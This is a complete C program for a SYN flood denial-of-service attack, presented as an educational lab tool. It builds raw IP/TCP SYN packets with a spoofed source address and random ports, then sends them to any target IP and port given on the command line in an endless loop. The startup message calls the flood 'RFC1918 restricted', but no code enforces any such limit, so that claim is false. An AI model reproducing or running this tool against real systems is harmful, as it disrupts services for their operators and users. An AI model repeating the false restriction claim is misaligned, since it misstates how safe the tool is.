/**
 * SYN Flood Tool (ANSI C)
 * ------------------------------------------------------------------------
 * Author: Dr. Burak BAYSAN (Forensic Computing / Cybersecurity Educator)
 * Purpose: Educational & Blue Team Training Use ONLY
 *
 * This program demonstrates how a SYN flood works at the packet construction level.
 * It builds raw IP and TCP SYN packets and sends them in a tight loop to a target.
 *
 * WARNING:
 * - This is a teaching tool for isolated lab networks.
 * - Running this on the public internet is illegal and unethical.
 * - You must run as root/admin to use raw sockets.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <time.h>

/**
 * IP Header Structure
 * -------------------
 * Fields are arranged according to the standard IPv4 header layout.
 */
struct ipheader {
    unsigned char  iph_ihl:4, iph_ver:4;  // Internet Header Length & Version
    unsigned char  iph_tos;               // Type of Service
    unsigned short iph_len;               // Total Length
    unsigned short iph_ident;             // Identification
    unsigned short iph_flag:3, iph_offset:13; // Flags & Fragment Offset
    unsigned char  iph_ttl;               // Time To Live
    unsigned char  iph_protocol;          // Protocol (TCP = 6)
    unsigned short iph_chksum;            // Header Checksum
    unsigned int   iph_sourceip;          // Source IP Address
    unsigned int   iph_destip;            // Destination IP Address
};

/**
 * TCP Header Structure
 * --------------------
 * Fields according to the standard TCP header layout.
 */
struct tcpheader {
    unsigned short tcph_srcport;          // Source Port
    unsigned short tcph_destport;         // Destination Port
    unsigned int   tcph_seqnum;           // Sequence Number
    unsigned int   tcph_acknum;           // Acknowledgement Number
    unsigned char  tcph_reserved:4, tcph_offset:4; // Data Offset & Reserved Bits
    unsigned char  tcph_flags;            // TCP Flags (SYN, ACK, etc.)
    unsigned short tcph_win;              // Window Size
    unsigned short tcph_chksum;           // Checksum
    unsigned short tcph_urgptr;           // Urgent Pointer
};

/**
 * Calculate checksum for given data block.
 * This function is used for both IP and TCP checksums.
 */
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b; 
    unsigned int sum = 0; 
    unsigned short result;

    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;

    // Fold 32-bit sum to 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    result = ~sum;
    return result;
}

/**
 * Pseudo Header Structure
 * -----------------------
 * Used only for calculating the TCP checksum.
 */
struct pseudo_header {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

int main(int argc, char *argv[]) {
    // Argument check
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    struct sockaddr_in sin;

    inet_aton(target_ip, &sin.sin_addr);

    // Create a raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed (requires root privileges)");
        exit(1);
    }

    // Allocate packet buffer
    char packet[4096];
    struct ipheader *ip = (struct ipheader *) packet;
    struct tcpheader *tcp = (struct tcpheader *) (packet + sizeof(struct ipheader));
    struct pseudo_header psh;

    // Setup target sockaddr_in structure
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // Seed random number generator for spoofed ports & sequence numbers
    srand(time(NULL));

    // Enable IP_HDRINCL to tell the kernel the IP header is included in the packet
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL setting failed");
        exit(1);
    }

    printf("SYN Flood started -> %s:%d (RFC1918 restricted)\n", target_ip, target_port);

    // Infinite loop to continuously send SYN packets
    while (1) {
        // Clear packet buffer
        memset(packet, 0, 4096);

        /** 
         * Construct the IP header
         */
        ip->iph_ver = 4; // IPv4
        ip->iph_ihl = 5; // IP header length
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
        ip->iph_ident = htons(rand() % 65535); // Random identification
        ip->iph_offset = 0;
        ip->iph_ttl = 64;
        ip->iph_protocol = IPPROTO_TCP; // TCP protocol
        ip->iph_sourceip = inet_addr("192.168.1.100"); // Spoofed source IP
        ip->iph_destip = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *) packet, sizeof(struct ipheader));

        /**
         * Construct the TCP header
         */
        tcp->tcph_srcport = htons(rand() % 65535); // Random source port
        tcp->tcph_destport = htons(target_port);
        tcp->tcph_seqnum = htonl(rand()); // Random sequence number
        tcp->tcph_acknum = 0; // No ACK in SYN
        tcp->tcph_offset = 5; // Data offset (no options)
        tcp->tcph_flags = TH_SYN; // Set only SYN flag
        tcp->tcph_win = htons(65535); // Maximum window size
        tcp->tcph_chksum = 0;
        tcp->tcph_urgptr = 0;

        /**
         * Build the pseudo header for TCP checksum calculation
         */
        psh.src_addr = ip->iph_sourceip;
        psh.dst_addr = ip->iph_destip;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcpheader));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcpheader);
        char *pseudogram = malloc(psize);

        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcpheader));

        tcp->tcph_chksum = checksum((unsigned short*) pseudogram, psize);
        free(pseudogram);

        /**
         * Send the packet
         */
        if (sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
                   (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("Packet sending failed");
        }
    }

    close(sock);
    return 0;
}
